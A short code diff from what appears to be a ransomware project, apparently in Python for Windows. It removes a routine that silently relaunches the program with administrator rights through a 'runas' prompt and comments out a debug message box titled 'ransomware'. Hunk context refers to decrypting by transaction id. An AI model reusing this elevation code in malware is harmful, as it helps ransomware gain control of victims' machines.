@@ -42,19 +42,7 @@ async def attempt_decrypt(transaction_id: str):
 
 
 
-def is_admin():
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
 
-
-def check_if_admin():
-    if not is_admin():
-        print(" ".join(sys.argv))
-        params = " ".join(sys.argv)
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 0)
-        sys.exit()
 
 # def iterate_all_files():
 #     # iterate over files in
@@ -245,7 +233,7 @@ def main_helper():
 
 if __name__ == "__main__":
     
-    ctypes.windll.user32.MessageBoxW(0, str(os.getpid()), "ransomware", 1)
+    #ctypes.windll.user32.MessageBoxW(0, str(os.getpid()), "ransomware", 1)
     #uvicorn.run(app, host="127.0.0.1", port=)
     set_watchdog()
     main_helper()
